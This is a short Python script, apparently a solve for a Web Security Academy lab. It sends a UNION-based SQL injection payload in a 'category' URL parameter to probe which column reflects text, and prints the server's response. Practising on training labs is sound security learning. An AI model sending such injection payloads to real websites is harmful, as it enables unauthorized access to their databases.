import requests

site = "ac411fd71e862abfc0d16ef9007300e8.web-security-academy.net"

if __name__ == "__main__":
    def try_category(category_string):
        url = f'https://{site}/filter?category={category_string}'
        resp = s.get(url)
        print(resp.text)


    s = requests.Session()
    try_category("""Lifestyle' UNION SELECT null,'M8S239',null -- """)
